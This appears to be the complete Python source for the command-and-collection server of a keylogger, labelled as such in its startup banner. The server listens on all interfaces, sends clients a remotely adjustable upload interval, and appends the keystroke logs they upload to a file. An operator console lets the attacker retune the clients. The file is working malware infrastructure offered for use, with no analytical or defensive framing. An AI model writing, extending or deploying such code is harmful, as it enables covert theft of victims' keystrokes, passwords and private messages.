import os
import socket
import threading
import datetime
import json

SERVER_PORT = 9999
LOG_FILE = 'server-copy.txt'
SETTINGS_FILE = 'settings.json'

# Default config
CLIENT_CONFIG = {
    'send_interval': 300,  # Default 5 minutes
    'buffer_size': 1024,
    'retry_attempts': 3,
    'config_check_interval': 30
}

config_lock = threading.Lock()
server_running = True  # Global flag to control server loop

def load_settings_from_file():
    """Load settings from settings.json file."""
    if os.path.exists(SETTINGS_FILE):
        try:
            with open(SETTINGS_FILE, 'r') as f:
                settings = json.load(f)
                return settings
        except Exception as e:
            print(f"Error loading settings: {e}")
    return None

def initialize_config():
    """Initialize config from settings file."""
    global CLIENT_CONFIG, SERVER_PORT, LOG_FILE
    
    settings = load_settings_from_file()
    if settings:
        # Update send interval from settings
        if 'send_interval_seconds' in settings:
            CLIENT_CONFIG['send_interval'] = settings['send_interval_seconds']
            print(f"Loaded send interval: {CLIENT_CONFIG['send_interval']} seconds")
        
        # Update port from settings
        if 'server_port' in settings:
            SERVER_PORT = settings['server_port']
            print(f"Loaded server port: {SERVER_PORT}")
        
        # Update log file path from settings
        if 'log_file_path' in settings:
            LOG_FILE = settings['log_file_path']
            print(f"Loaded log file: {LOG_FILE}")
    else:
        print("No settings file found, using defaults")
    
    print(f"\nCurrent Configuration:")
    print(f"  - Send Interval: {CLIENT_CONFIG['send_interval']} seconds")
    print(f"  - Server Port: {SERVER_PORT}")
    print(f"  - Log File: {LOG_FILE}")
    print()

def update_config(new_interval):
    """Update send interval configuration."""
    global CLIENT_CONFIG
    with config_lock:
        CLIENT_CONFIG['send_interval'] = new_interval
        print(f"\n{'='*60}")
        print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] CONFIG UPDATED!")
        print(f"New send interval: {new_interval} seconds")
        print(f"{'='*60}\n")

def handle_config_request(client_socket, address):
    """Send configuration to client."""
    try:
        with config_lock:
            config_json = json.dumps(CLIENT_CONFIG)
        client_socket.send(config_json.encode('utf-8'))
        print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] Sent config to {address[0]}")
    except Exception as e:
        print(f"Error sending config: {e}")
    finally:
        client_socket.close()

def handle_log_upload(client_socket, address):
    """Receive and save logs from client."""
    try:
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open(LOG_FILE, 'ab') as f:
            separator = f"\n{'='*60}\n[Connection from {address[0]} at {timestamp}]\n{'='*60}\n".encode('utf-8')
            f.write(separator)
            total_bytes = 0
            while True:
                data = client_socket.recv(1024)
                if not data:
                    break
                f.write(data)
                total_bytes += len(data)
            f.write(b'\n')
        print(f"[{timestamp}] Received {total_bytes} bytes from {address[0]}")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        client_socket.close()

def handle_client(client_socket, address):
    """Handle incoming client connection."""
    try:
        request_type = client_socket.recv(1).decode('utf-8')
        if request_type == 'C':
            handle_config_request(client_socket, address)
        elif request_type == 'L':
            handle_log_upload(client_socket, address)
        else:
            client_socket.close()
    except Exception as e:
        client_socket.close()

def command_interface():
    """Command line interface for server control."""
    global server_running
    print("\nAvailable commands:")
    print("  help              - Show available commands")
    print("  interval <seconds> - Change send interval")
    print("  show              - Show current config")
    print("  reload            - Reload settings from file")
    print("  quit              - Shutdown server")
    print()
    
    while server_running:
        try:
            cmd = input("server> ").strip().lower()
            
            if cmd == 'help':
                print("\nAvailable commands:")
                print("  help              - Show available commands")
                print("  interval <seconds> - Change send interval")
                print("  show              - Show current config")
                print("  reload            - Reload settings from file")
                print("  quit              - Shutdown server\n")
            
            elif cmd.startswith('interval '):
                try:
                    new_interval = int(cmd.split()[1])
                    if new_interval < 5:
                        print("Interval must be >= 5 seconds")
                    else:
                        update_config(new_interval)
                except:
                    print("Usage: interval <seconds>")
            
            elif cmd == 'show':
                print(f"\nCurrent Configuration:")
                print(f"  Send Interval: {CLIENT_CONFIG['send_interval']} seconds")
                print(f"  Buffer Size: {CLIENT_CONFIG['buffer_size']} bytes")
                print(f"  Retry Attempts: {CLIENT_CONFIG['retry_attempts']}")
                print(f"  Server Port: {SERVER_PORT}")
                print(f"  Log File: {LOG_FILE}\n")
            
            elif cmd == 'reload':
                print("\nReloading settings from file...")
                initialize_config()
            
            elif cmd == 'quit':
                print("\nShutting down server...")
                server_running = False
                break
            
            else:
                print("Unknown command. Type 'help' for available commands.")
        
        except EOFError:
            break
        except Exception as e:
            print(f"Error: {e}")

# --- Main server ---
print("="*60)
print("Keylogger Server Starting...")
print("="*60)

# Initialize configuration from settings file
initialize_config()

# Create socket
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

try:
    s.bind(("0.0.0.0", SERVER_PORT))
    s.listen(10)
    
    print(f"Server started on port {SERVER_PORT}")
    print(f"Log file: {LOG_FILE}")
    print(f"Send interval: {CLIENT_CONFIG['send_interval']} seconds")
    print("="*60)
    
    # Start command interface thread
    cmd_thread = threading.Thread(target=command_interface, daemon=True)
    cmd_thread.start()
    
    # Accept client connections
    while server_running:
        s.settimeout(1.0)  # Timeout to check server_running flag
        try:
            client_socket, address = s.accept()
            client_thread = threading.Thread(target=handle_client, args=(client_socket, address))
            client_thread.start()
        except socket.timeout:
            continue
        except Exception as e:
            if server_running:
                print(f"Error accepting connection: {e}")

except OSError as e:
    print(f"Error: Could not bind to port {SERVER_PORT}")
    print(f"   {e}")
    print(f"   Port may already be in use.")

finally:
    s.close()
    print("\nServer socket closed")
    print("="*60)